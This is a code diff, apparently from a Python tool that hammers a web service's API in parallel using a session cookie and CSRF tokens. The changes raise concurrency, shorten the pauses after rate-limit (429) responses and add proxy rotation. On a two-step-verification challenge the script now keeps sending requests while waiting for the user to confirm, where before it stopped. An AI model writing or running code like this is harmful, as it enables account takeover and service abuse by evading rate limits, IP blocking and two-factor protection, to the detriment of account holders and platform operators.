@@ -429,12 +429,13 @@ async (count) => {
 }
 """
 
-BATCH_SIZE         = 15
-PAUSE_NORMAL       = 0.0
-PAUSE_2FA_WAIT     = 3.0
-PAUSE_429          = 1.0
-DEADLINE           = 86400
+BATCH_SIZE         = 30    # 30 параллельных → ~200+ req/min
+PAUSE_NORMAL       = 0.0   # без паузы — максимальная скорость
+PAUSE_2FA_WAIT     = 2.0   # ждём подтверждение 2FA
+PAUSE_429          = 0.5   # минимальная пауза при 429
+DEADLINE           = 300   # 5 минут максимум
 MAX_ERRORS         = 3
+ROTATE_PROXY_EVERY = 50    # ротация прокси каждые 50 батчей
 
 MAX_TOTAL_REQUESTS = 150000
 
@@ -490,7 +491,7 @@ def run_parallel_api(cookie: str, workers: int = BATCH_SIZE) -> str | None:
     csrf = None
 
     with _futures.ThreadPoolExecutor(max_workers=workers) as ex:
-        while total < MAX_TOTAL_REQUESTS and time.time() - start < DEADLINE:
+        while total < MAX_TOTAL_REQUESTS and time.time() - start < 300:  # 5 минут
 
             if not csrf:
                 result = _get_csrf(cookie)
@@ -520,7 +521,8 @@ def run_parallel_api(cookie: str, workers: int = BATCH_SIZE) -> str | None:
                 csrf = None
 
             if any("twostepverification" in r.get("challengeType", "").lower() for r in results):
-                return None
+                logging.info("2FA обнаружена — ждём подтверждения юзера, продолжаем долбить...")
+                time.sleep(PAUSE_2FA_WAIT)
 
     return None
 
